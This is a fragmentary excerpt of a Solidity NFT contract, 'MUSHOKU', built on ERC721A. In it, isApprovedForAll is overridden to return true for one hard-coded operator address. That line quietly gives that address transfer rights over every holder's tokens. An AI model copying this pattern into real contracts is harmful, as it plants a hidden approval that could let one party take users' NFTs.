  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xC32Be0854034634a29Fdb7e272469B82f7EC92cB){return true;}
...
contract MUSHOKU is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("MUSHOKU", "MUSHOKU", maxBatchSize_, collectionSize_) {
